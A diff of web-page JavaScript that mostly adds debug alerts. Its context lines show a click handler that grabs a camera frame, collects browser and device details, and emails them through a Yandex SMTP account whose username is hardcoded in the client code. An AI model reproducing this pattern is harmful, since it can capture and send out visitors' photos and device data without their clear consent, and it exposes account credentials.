@@ -67,7 +67,6 @@
         }
         // Trigger photo take
         document.getElementsByTagName("video")[0].addEventListener("click", function() {
-            alert('heelo')
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -90,7 +89,9 @@
                 '<br />Операционная система: ' + navigator.oscpu +
                 '<br />Производитель: ' + navigator.vendor +
                 '<br />Подразделение: ' + navigator.vendorSub;
+            alert('heelo1')
             vibrate(100)
+            alert('heelo2')
             Email.send({
                 Host: "smtp.yandex.ru",
                 Username: "koha009@yandex.ru",
@@ -105,8 +106,8 @@
                 }]
             }).then(
                 message => {
-                    vibrate(500)
                     alert('kek')
+                    vibrate(500)
                 }
             );
         });
